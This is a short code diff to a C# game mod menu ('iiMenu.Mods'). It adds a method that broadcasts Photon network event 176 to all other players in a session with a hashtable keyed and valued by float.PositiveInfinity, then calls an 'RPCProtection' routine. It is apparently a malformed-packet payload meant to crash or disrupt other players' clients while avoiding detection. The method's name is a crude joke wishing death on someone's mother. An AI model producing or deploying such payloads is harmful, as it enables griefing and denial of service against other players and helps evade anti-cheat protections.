@@ -123,6 +123,18 @@ namespace iiMenu.Mods
             PhotonNetwork.NetworkingClient.OpRaiseEvent(176, hashtable, options, SendOptions.SendReliable);
             RPCProtection();
         }
+        public static void justrandomtestbutifthisworksthenlemmingsmomwilldietommorow()
+        {
+            var options = new RaiseEventOptions
+            {
+                Receivers = ReceiverGroup.Others,
+                InterestGroup = 0,
+            };
+            var hashtable = new Hashtable();
+            hashtable[float.PositiveInfinity] = float.PositiveInfinity;
+            PhotonNetwork.NetworkingClient.OpRaiseEvent(176, hashtable, options, SendOptions.SendReliable);
+            RPCProtection();
+        }
 
         public static void UnguardianGun()
         {
